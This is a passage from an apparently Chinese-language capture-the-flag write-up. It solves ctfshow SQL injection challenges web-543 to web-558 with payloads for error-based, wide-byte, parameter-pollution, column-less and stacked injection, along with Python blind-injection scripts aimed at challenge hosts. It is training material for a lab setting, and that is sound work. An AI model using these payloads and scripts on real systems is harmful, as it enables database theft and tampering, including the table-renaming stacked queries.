class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">or</span>替换+空格过滤绕过+<span class="hljs-keyword">sql</span>结束字符过滤<br><br>确定闭合方式<br>?di=<span class="hljs-number">1</span> 正常回显<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; 回显异常，报错信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>%<span class="hljs-number">23</span> 报错 后面有<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&#x27;，说明%23闭合失败，可能被过滤，使用“;%00”替代</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>;%<span class="hljs-number">00</span> 回显正常，这里确定为单引号闭合<br><br>注入方式尝试<br>括号和注释符被过滤，<span class="hljs-keyword">union</span>联合查询不容易使用括号过滤，考虑到页面回显报错，使用报错注入试试<br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;(or)updatexml(1,concat(0x7e,(select(database())),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">页面提示：()updatexml(1,concat(0x7e,(select(database())),0x7e),1);</span><br><span class="hljs-string"></span><br><span class="hljs-string">提示表明，“or”没显示，表名“or”被替换，那么使用“||”替代</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(database_name))<span class="hljs-keyword">from</span>(mysql.innodb_table_stats)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(select(table_name)from(mysql.innodb_table_stats)where(database_name)=&#x27;</span>ctfshow<span class="hljs-string">&#x27;),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)=<span class="hljs-string">&#x27;flags&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,right((select(flag4s)from(ctfshow.flags)),32),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,right((<span class="hljs-keyword">select</span>(flag4s)<span class="hljs-keyword">from</span>(ctfshow.flags)),<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-544-绕过过滤、布尔盲注"><a href="#web-544-绕过过滤、布尔盲注" class="headerlink" title="web-544 绕过过滤、布尔盲注"></a>web-544 绕过过滤、布尔盲注</h2><p>既不显示报错信息又过滤了空格</p><p>id&#x3D;1成功</p><p>id&#x3D;1’报错</p><p>id&#x3D;1’;%00还报错则不是’闭合</p><p>id&#x3D;1’)报错</p><p>id&#x3D;1’);%00成功则是’)闭合</p><ol><li>经过测试，过滤的字符有：</li></ol><ul><li><ul><li><ul><li>\ &#x2F; – –+ &#x2F;**&#x2F; %23 and or</li></ul></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://795d93a2-1df8-46f4-b6ae-c1bbb84c1157.challenge.ctf.show/?id=100&#x27;)&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        payload = f<span class="hljs-string">&#x27;||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;||if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        r = requests.get(url+payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">head</span> = mid + 1<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">tail</span> = mid<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>        <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-545-大小写混合绕过、-0a绕过、-00sql结束符、id-100’"><a href="#web-545-大小写混合绕过、-0a绕过、-00sql结束符、id-100’" class="headerlink" title="web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id&#x3D;100’"></a>web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id&#x3D;100’</h2><p>用%0a即可绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from<span class="hljs-variable">%0</span>ainformation_schema.tables<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a table_schema<span class="hljs-operator">=</span>&#x27;ctfshow&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from<span class="hljs-variable">%0</span>ainformation_schema.columns<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a table_name<span class="hljs-operator">=</span>&#x27;flags&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>concat(id<span class="hljs-punctuation">,</span>&#x27;-&#x27;<span class="hljs-punctuation">,</span>flag<span class="hljs-number">4</span>s)from<span class="hljs-variable">%0</span>actfshow.flags<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><p>也可以盲注</p><p>过滤了select</p><p>select大小写混合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://857803fc-3f61-4ec6-8084-214ad94d5be4.challenge.ctf.show:8080/&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>    mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    payload = f<span class="hljs-string">&#x27;if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>: f<span class="hljs-string">&quot;100&#x27;||&#123;payload&#125;||&#x27;0&quot;</span><br>    &#125;<br>    r = requests.get(url,params=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">head</span> = mid + 1<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">tail</span> = mid<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>    result += chr(<span class="hljs-built_in">head</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-546-id-100”、其他同上"><a href="#web-546-id-100”、其他同上" class="headerlink" title="web-546 id&#x3D;100”、其他同上"></a>web-546 id&#x3D;100”、其他同上</h2><p>就换了个闭合，其他一样</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">111</span><span class="hljs-string">&quot;%0auNIon%0asElEct<span class="hljs-variable">%0a</span>  1,2,group_concat(table_name)from<span class="hljs-variable">%0ainformation_schema</span>.tables%0awhere<span class="hljs-variable">%0a</span>  table_schema=&#x27;ctfshow&#x27;<span class="hljs-variable">%0a</span> ;<span class="hljs-variable">%00</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">id=111&quot;</span>%0auNIon%0asElEct<span class="hljs-variable">%0a</span>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)from<span class="hljs-variable">%0actfshow</span>.flags<span class="hljs-variable">%0a</span> ;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://642ba949-092a-4d73-bdc6-3914a631fdf0.challenge.ctf.show:8080/&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>    mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    payload = f<span class="hljs-string">&#x27;if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>: f<span class="hljs-string">&#x27;100&quot;||&#123;payload&#125;||&quot;0&#x27;</span><br>    &#125;<br>    r = requests.get(url,params=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">head</span> = mid + 1<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">tail</span> = mid<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>    result += chr(<span class="hljs-built_in">head</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><hr><h2 id="web-547-大小写混合绕过、复写绕过"><a href="#web-547-大小写混合绕过、复写绕过" class="headerlink" title="web-547 大小写混合绕过、复写绕过"></a>web-547 大小写混合绕过、复写绕过</h2><p>过滤的有点奇怪多进行尝试</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from<span class="hljs-variable">%0</span>ainformation_schema.tables<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a  table_schema<span class="hljs-operator">=</span>&#x27;ctfshow&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from<span class="hljs-variable">%0</span>ainformation_schema.columns<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a  table_name<span class="hljs-operator">=</span>&#x27;flags&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag<span class="hljs-number">4</span>s)from<span class="hljs-variable">%0</span>actfshow.flags<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="web-548-同上"><a href="#web-548-同上" class="headerlink" title="web-548 同上"></a>web-548 同上</h2><p>和上题一模一样</p><hr><h2 id="web-549-代码逻辑漏洞导致的重复参数注入"><a href="#web-549-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-549 代码逻辑漏洞导致的重复参数注入"></a>web-549 代码逻辑漏洞导致的重复参数注入</h2><p>思路（代码逻辑漏洞导致的重复参数注入）：</p><p>二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。</p><p>根据源代码，get提交的参数，如果重名，则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值。<br>但是验证id是否是数字却只是验证了第一个id参数</p><p>其实第29关（web549）是用jsp搭建的服务器，所以建议在电脑中安装Jspstudy来安装Jsp的环境。</p><p>构造两个id参数，index.php?id&#x3D;1&amp;id&#x3D;2，Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-550-id-0”-代码逻辑漏洞导致的重复参数注入"><a href="#web-550-id-0”-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-550 id&#x3D;0” 代码逻辑漏洞导致的重复参数注入"></a>web-550 id&#x3D;0” 代码逻辑漏洞导致的重复参数注入</h2><p>“闭合其他和上题一样</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%00<br></code></pre></td></tr></table></figure><hr><h2 id="web-551-id-0”-代码逻辑漏洞导致的重复参数注入"><a href="#web-551-id-0”-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-551 id&#x3D;0”) 代码逻辑漏洞导致的重复参数注入"></a>web-551 id&#x3D;0”) 代码逻辑漏洞导致的重复参数注入</h2><p>“)闭合其他和上题一样</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;)union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%00<br></code></pre></td></tr></table></figure><hr><h2 id="web-552-宽字节注入、无列名注入"><a href="#web-552-宽字节注入、无列名注入" class="headerlink" title="web-552 宽字节注入、无列名注入"></a>web-552 宽字节注入、无列名注入</h2><p>通过测试发现1’会被转化为1\‘</p><p><strong>这里利用了宽字节注入</strong></p><p>GBK 是占两个字节（也就是名叫宽字节，只要字节大于1的都是）</p><p>“ \ ”即url里面的“ %5c ”</p><p>我们在前面加上一个%df让他跟%5c组成%df%5c变成<strong>縗</strong></p><p>不只是能和%df组合 组合后ascill大于128就可以</p><ol><li>GBK首字节对应0x81-0xfe(129-239),尾字节对应0x40-0xfe(64-126)(除了0x7f【128】)</li></ol><p>比如一些 %df’ %81’ %82’ %de’ 等等</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs q">查库<br><br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">00</span><br>查表时没法用<span class="hljs-built_in">where</span> table_schema=&#x27;ctfshow&#x27;里面有&#x27;而且不知为何不能用宽字节注入<br><br>所以就查出所有的表<br><br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span>;%<span class="hljs-number">00</span><br>之后就是有库名有表名<br><br>进行无列名注入<br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> as b <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-553-宽字节注入"><a href="#web-553-宽字节注入" class="headerlink" title="web-553 宽字节注入"></a>web-553 宽字节注入</h2><p>和上题一样就是不能用;%00进行闭合了可以改用–+</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-554-POST宽字节注入"><a href="#web-554-POST宽字节注入" class="headerlink" title="web-554 POST宽字节注入"></a>web-554 POST宽字节注入</h2><p>因为会把%也给\了所以要在bp上操作</p><p>国光大佬还写了一个新方法：</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为�，从而得到了一个能被utf-8解析<br>为汉字的字节。<br>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><p>➜ ~ echo ‘|iconv -f utf-8 -t utf-16<br>��’<br>➜ ~ echo ‘|iconv -f utf-8 -t utf-32<br>��’</p><p>uname&#x3D;-1�’union select 1,(select group_concat(flag4s) from ctfshow.flags)–+&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><hr><h2 id="web-555-无列名注入-id-0"><a href="#web-555-无列名注入-id-0" class="headerlink" title="web-555 无列名注入 id&#x3D;0"></a>web-555 无列名注入 id&#x3D;0</h2><p>数字型注入其他和上一题一样</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">因为<span class="hljs-string">&#x27;&#x27;</span>被加了\所以无法使用<span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span>，只能查所有表名<br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;<span class="hljs-comment">--+</span><br><br>列名一样<br><br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(b)<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags)a<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-556-同上"><a href="#web-556-同上" class="headerlink" title="web-556 同上"></a>web-556 同上</h2><p>和上面的题重复了</p><p>?id&#x3D;0%df’ union select 1,2,group_concat(b)from (select 1,2 as b union select * from ctfshow.flags)a–+</p><hr><h2 id="web-557-POST宽字节注入、union无列名注入"><a href="#web-557-POST宽字节注入、union无列名注入" class="headerlink" title="web-557 POST宽字节注入、union无列名注入"></a>web-557 POST宽字节注入、union无列名注入</h2><p>bp post传</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">uname=admin%df&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b)<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags)a--+&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure><hr><h2 id="web-558-堆叠注入"><a href="#web-558-堆叠注入" class="headerlink" title="web-558 堆叠注入"></a>web-558 堆叠注入</h2><p><strong>堆叠注入：</strong></p><p>MySQL 的命令行中，每一条语句以 <code>;</code> 结尾，这代表语句的结束，如果在注入过程中在 <code>;</code> 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。</p><p>局限性</p><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">?id=<span class="hljs-number">1</span>&#x27;;CREATE TABLE <span class="hljs-keyword">flags</span> SELECT * FROM ctfshow.<span class="hljs-keyword">flags</span>;rename <span class="hljs-built_in">table</span> users <span class="hljs-keyword">to</span> a;rename <span class="hljs-built_in">table</span> <span class="hljs-keyword">flags</span> <span class="hljs-keyword">to</span> users;<br></code></pre></td></tr></table></figure><p>创建一个名为”flags”的新表，通过选择来自”ctfshow”模式的”flags”表中的所有列和行。接下来，你尝试将名为”users”的表重命名为”a”，然后将名为”flags”的表重命名为”users”。</p><p>再查询id&#x3D;1即可</p><p>还有一种方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">77</span>,(<span class="hljs-keyword">select</span> group_concat(flag4s) <span class="hljs-keyword">from</span> ctfshow.flags),&quot;don77&quot;)<span class="hljs-comment">-- 